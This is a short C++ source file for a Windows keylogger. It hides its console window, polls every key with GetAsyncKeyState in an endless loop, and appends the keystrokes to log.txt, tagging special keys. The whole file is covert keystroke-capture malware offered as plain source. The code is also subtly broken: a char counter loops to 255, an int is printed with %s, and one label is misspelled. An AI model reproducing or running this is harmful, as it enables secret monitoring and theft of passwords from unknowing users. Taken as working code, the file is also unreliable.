//  By Hugo Lewczak
// Made in Microsoft Visual Studio 2022
#include <iostream>
#include <Windows.h>

using namespace std;

int Save(int _key, const char *file);

int main() {

	FreeConsole();

	char i;
	while (true) {
		Sleep(10);
		for (i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				Save(i, "log.txt");
			}
		}
	}

	return 0;
}

int Save(int _key, const char *file) {

	cout << _key << endl;

	Sleep(10);

	FILE* OUTPUT_FILE;

	OUTPUT_FILE = fopen(file, "a+");
	
	switch (_key) {
	case VK_SHIFT:
		fprintf(OUTPUT_FILE, "%s ", "[SHIFT]");
		break;

	case VK_BACK:
		fprintf(OUTPUT_FILE, "%s ", "[BACKSPACE]");
		break;

	case VK_LBUTTON:
		fprintf(OUTPUT_FILE, "%s ", "[LMOUSE]");
		break;

	case VK_RETURN:
		fprintf(OUTPUT_FILE, "%s ", "[ENTER]");
		break;

	case VK_ESCAPE:
		fprintf(OUTPUT_FILE, "%s ", "[ESCAPE]");
		break;

	case VK_CONTROL:
		fprintf(OUTPUT_FILE, "%s ", "[CTRL]");
		break;

	case VK_RBUTTON:
		fprintf(OUTPUT_FILE, "%s ", "[RMOUSE]");
		break;

	case VK_CAPITAL:
		fprintf(OUTPUT_FILE, "%s, ", "[CAPITALSE]");
		break;

	default:
		fprintf(OUTPUT_FILE, "%s ", &_key);
	}

	fclose(OUTPUT_FILE);

	return 0;
}
